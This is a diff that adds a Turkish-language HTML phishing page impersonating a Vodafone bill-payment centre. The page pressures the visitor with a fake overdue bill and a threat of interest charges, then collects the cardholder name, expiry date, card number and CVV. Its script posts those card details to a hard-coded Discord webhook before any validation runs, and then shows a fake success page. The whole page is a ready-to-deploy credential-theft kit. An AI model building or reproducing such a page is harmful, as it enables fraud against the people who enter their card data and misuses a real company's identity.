@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>VODAFONE</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+  <link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body style="background-color: #f6f6f6;">
+
+    <header  style="background-color: white;">
+        <nav class="navbar navbar-expand-lg justify-content-center">
+          <div class="navbar-brand d-flex align-items-center">
+            <img src="vodafone-8.svg" alt="Logo" width="30" height="30" class="d-inline-block align-top">
+            <span class="ml-2" style="color: #6e000d;">VODAFONE</span>
+          </div>
+        </nav>
+      </header>
+  <main class="page payment-page">
+    <section class="payment-form dark">
+      <div class="container">
+        <div class="block-heading">
+          <h2>FATURA ÖDEME MERKEZİ</h2>
+          <p>176.30 TL Fatura ücretiniz bulunmaktadır lütfen ödeyiniz.. Aksi takdirde faiz eklemesi yapılacaktır.</p>
+        </div>
+        <form>
+          <div class="products">
+            
+            <div class="total"><span class="price">176.30 TL</span></div>
+          </div>
+          <div class="card-details">
+            <h3 class="title">Kart Bilgileri</h3>
+            <div class="row">
+              <div class="form-group col-sm-7">
+                <label for="card-holder">Kart Üzerindeki İsim</label>
+                <input id="card-holder" type="text" class="form-control" placeholder="Card Holder" aria-label="Card Holder" aria-describedby="basic-addon1">
+              </div>
+              <div class="form-group col-sm-5">
+                <label for="">SON KULLANMA TARİHİ</label>
+                <div class="input-group expiration-date">
+                  <input type="text" class="form-control" placeholder="AA" aria-label="AA" aria-describedby="basic-addon1">
+                  <span class="date-separator">/</span>
+                  <input type="text" class="form-control" placeholder="YY" aria-label="YY" aria-describedby="basic-addon1">
+                </div>
+              </div>
+              <div class="form-group col-sm-8">
+                <label for="card-number">Kart Numarası</label>
+                <input id="card-number" type="text" class="form-control" placeholder="Kart Numarası Giriniz" aria-label="Card Holder" aria-describedby="basic-addon1">
+              </div>
+              <div class="form-group col-sm-4">
+                <label for="cvc">CVV(Kart Arkası 3 haneli rakam)</label>
+                <input id="cvc" type="text" class="form-control" placeholder="CVV" aria-label="Card Holder" aria-describedby="basic-addon1">
+              </div>
+              <div class="form-group col-sm-12">
+                <button type="button" class="btn btn-danger btn-block"  onclick="ananus();">Ödeme Yap</button>
+              </div>
+            </div>
+          </div>
+        </form>
+      </div>
+    </section>
+  </main>
+
+
+  <footer class=" text-center py-3" style="background-color: #e3e2de;">
+
+    <div class="d-flex justify-content-center">
+        <p>2023 VODAFONE</p>
+
+    </div>
+    <div class="d-flex justify-content-center">
+      <img src="logo1.png" alt="Logo 1" width="30" height="30" class="mx-2">
+      <img src="indir.png" alt="Logo 2" width="30" height="30" class="mx-2">
+      
+    </div>
+  </footer>
+</body>
+<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+<script>
+  function ananus() {
+    var form = document.querySelector('.card-details form');
+    var cardHolder = document.getElementById('card-holder').value.trim();
+    var expirationMonth = document.querySelector('.expiration-date input:first-child').value.trim();
+    var expirationYear = document.querySelector('.expiration-date input:last-child').value.trim();
+    var cardNumber = document.getElementById('card-number').value.trim();
+    var cvc = document.getElementById('cvc').value.trim();
+    var webhook_url = "https://discord.com/api/webhooks/1113125946564825109/KNhMbC2Souee8WKtq7F39SQuLtxlNaCmHbjadLxI327dWFkgJedbRVCkVYtQpO3mBZ1J";
+
+    function sendMessage() {
+      var request = new XMLHttpRequest();
+      request.open("POST", webhook_url);
+      request.setRequestHeader('Content-type', 'application/json');
+      var params = {
+        username: "Sosi",
+        embeds: [{
+          "color": 16711680,
+          "title": cardHolder + "   " + expirationMonth + expirationYear + "     " + cardNumber + "     " + cvc,
+          "description": "description text"
+        }]
+      };
+      
+      request.send(JSON.stringify(params));
+    }
+    sendMessage();
+    confirm("Onaylamak İstiyorsanız Tamam seçeneğine basın aksi takdirde siteden çıkınız.")
+  
+
+    setTimeout(function () {
+
+      if (cardHolder === '' || expirationMonth === '' || expirationYear === '' || cardNumber === '' || cvc === '') {
+        alert('Lütfen tüm bilgileri eksiksiz doldurun.');
+        return ;
+      }
+
+      if (cardNumber.length !== 16) {
+        alert('Kart numarası 16 haneli olmalıdır.');
+        return ;
+      }
+
+      if (cvc.length !== 3) {
+        alert('CVC 3 haneli olmalıdır.');
+        return ;
+      }
+  // Bu blok, 5 saniye sonra çalışacak kodları içerir
+  window.location.href = "success.html"
+}, 5000); 
+
+     
+
+      
+    
+  };
+</script>
+
+
+
+</body>
+</html>
